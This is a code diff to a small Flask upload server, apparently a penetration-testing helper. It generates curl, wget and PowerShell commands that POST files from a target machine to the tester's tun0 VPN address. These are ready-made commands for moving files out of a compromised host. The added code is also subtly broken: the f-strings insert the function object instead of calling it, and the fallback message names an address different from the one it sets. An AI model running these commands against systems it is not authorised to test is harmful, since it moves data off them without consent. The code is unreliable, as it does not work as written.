@@ -5,12 +5,20 @@ from flask import Flask, request, jsonify
 import os
 import hashlib
 
+def get_tun0_ip():
+    try:
+        ip = subprocess.check_output("ip a | grep -A 2 'tun0:' | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'", shell=True).decode().strip()
+    except:
+        print('No tun0 - use 0.0.0.0')
+        ip = '127.0.0.1'
+    return ip
+
 upload_commands = {
-    "curl": '''curl -F "file=@./curl.txt" http://127.0.0.1/curl''',
+    "curl": f'''curl -F "file=@./curl.txt" http://{get_tun0_ip}/curl''',
 
-    "wget": '''wget --method=POST --body-file=wget.txt "http://127.0.0.1/wget?filename=wget.txt"''',
+    "wget": f'''wget --method=POST --body-file=wget.txt "http://{get_tun0_ip}/wget?filename=wget.txt"''',
 
-    "powershell": '''$f="C:\\ps.txt"; $b=[guid]::NewGuid(); $c=[System.Text.Encoding]::GetEncoding("iso-8859-1").GetString([IO.File]::ReadAllBytes($f)); $d="--$b`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$([IO.Path]::GetFileName($f))`"`r`nContent-Type: application/octet-stream`r`n`r`n$c`r`n--$b--`r`n"; Invoke-WebRequest -Uri "http://127.0.0.1/ps" -Method POST -Body $d -ContentType "multipart/form-data; boundary=$b"'''
+    "powershell": f'''$f="C:\\ps.txt"; $b=[guid]::NewGuid(); $c=[System.Text.Encoding]::GetEncoding("iso-8859-1").GetString([IO.File]::ReadAllBytes($f)); $d="--$b`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$([IO.Path]::GetFileName($f))`"`r`nContent-Type: application/octet-stream`r`n`r`n$c`r`n--$b--`r`n"; Invoke-WebRequest -Uri "http://{get_tun0_ip}/ps" -Method POST -Body $d -ContentType "multipart/form-data; boundary=$b"'''
 }
 
 parser = argparse.ArgumentParser(description='Simple HTTP Server for PHP, Python')
